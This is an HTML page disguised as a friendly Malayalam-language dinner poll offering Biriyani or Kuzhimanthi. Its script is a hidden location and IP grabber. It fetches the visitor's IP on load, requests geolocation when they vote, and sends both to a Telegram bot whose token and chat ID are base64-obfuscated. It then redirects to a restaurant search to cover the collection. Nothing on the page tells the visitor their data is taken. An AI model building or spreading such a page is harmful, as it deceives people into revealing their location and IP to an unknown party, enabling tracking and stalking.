<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dinner Poll</title>
    <style>
        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; text-align: center; padding: 15px; margin: 0; }
        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        h2 { color: #d35400; margin: 10px 0; }
        .food-item { margin-bottom: 25px; cursor: pointer; border: 2px solid #eee; border-radius: 12px; overflow: hidden; transition: 0.3s; background: #fff; }
        .food-item:hover { border-color: #d35400; transform: translateY(-5px); }
        img { width: 100%; height: 250px; object-fit: cover; display: block; }
        .name { font-weight: bold; padding: 12px; display: block; background: #fff; color: #333; font-size: 18px; }
        #status { display: none; color: #27ae60; font-weight: bold; margin-top: 15px; font-size: 18px; }
    </style>
</head>
<body onload="initData()">
    <div class="container">
        <h2>ഇന്ന് ഏത് വേണം? 😋</h2>
        <p>നിനക്ക് ഇഷ്ടമുള്ളത് ഒന്ന് സെലക്ട് ചെയ്യൂ!</p>

        <div class="food-item" onclick="handleVote('Biriyani')">
            <img src="https://images.unsplash.com/photo-1563379091339-03b21ab4a4f8?q=80&w=1000&auto=format&fit=crop" alt="Biriyani">
            <span class="name">🍗 HYDERABADI BIRIYANI</span>
        </div>

        <div class="food-item" onclick="handleVote('Kuzhimanthi')">
            <img src="https://images.unsplash.com/photo-1633945274405-b6c8069047b0?q=80&w=1000&auto=format&fit=crop" alt="Kuzhimanthi">
            <span class="name">🥘 ARABIAN KUZHIMANTHI</span>
        </div>

        <div id="status">Thanks! Ordering soon... ❤️</div>
    </div>

    <script>
        let user_ip = "N/A";
        const tok = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
        const cid = "NzAwODk1Mjc0Ng==";

        async function initData() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                user_ip = data.ip;
            } catch(e) {}
        }

        function handleVote(food) {
            document.getElementById('status').style.display = 'block';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => sendData(food, p.coords.latitude + "," + p.coords.longitude), 
                    () => sendData(food, "Denied")
                );
            } else {
                sendData(food, "No-Geo");
            }
        }

        async function sendData(food, loc) {
            const botToken = atob(tok);
            const chatId = atob(cid);
            const msg = `🍽 *Vote:* ${food}\n🌐 *IP:* ${user_ip}\n📍 *Loc:* ${loc}`;
            
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
            
            setTimeout(() => {
                window.location.href = "https://www.google.com/search?q=restaurants+near+me";
            }, 2000);
        }
    </script>
</body>
</html>
